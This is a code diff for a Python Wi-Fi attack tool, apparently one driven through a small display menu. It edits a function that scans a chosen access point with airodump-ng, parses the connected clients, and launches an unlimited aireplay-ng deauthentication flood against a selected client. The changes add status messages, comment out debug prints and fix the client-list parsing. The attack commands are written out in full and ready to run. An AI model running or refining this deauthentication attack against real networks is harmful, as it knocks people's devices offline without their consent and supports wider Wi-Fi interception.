@@ -235,7 +235,7 @@ def displayMsg(msg,t):
             "",
             "",
             "",
-            msg,
+            str(msg),
             "",
             "",
             ""
@@ -1705,12 +1705,12 @@ def deautherClient():
     except:
         displayError()
         return()
-
+    displayMsg("select the Client",1)
     if(not selectedAP):
         displayError()
         return()
     cmd = " airodump-ng -d " + selectedAP[2] + " -c " + selectedAP[1] + " wlan0mon -w result"
-    print(cmd)
+    #print(cmd)
 
     if(autoKillCommand(cmd,20)==-1):
         displayError()
@@ -1723,11 +1723,13 @@ def deautherClient():
     ret = str(ret).replace("\\r","").split("\\n")
     toRemove=ret.index("Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs")
     ret=ret[toRemove+1:-1]
-    print(ret)
+    #print(ret)
+    del ret[-1]
     for i in range(0,len(ret)):
-        ret[i] = ret[i].split(",")[1]
+        ret[i] = ret[i].split(",")[0]
     selectedtarget = checklist(ret)   
-    print(selectedtarget)
+    #print(selectedtarget)
+    displayMsg("Deauthing",1)
     tx1="airodump-ng -c " + str(selectedAP[1] )+" --bssid " + str(selectedAP[2]) + " wlan0mon"
     tx2= "aireplay-ng -0 0 -a " + str(selectedAP[2]) + " -c " + str(selectedtarget)+" wlan0mon"
     print(tx1)
@@ -1738,7 +1740,7 @@ def deautherClient():
     if(autoKillCommand(tx2,10)==-1):
         displayError()
         return()
-    
+    displayMsg("Done",4)
 
 
 
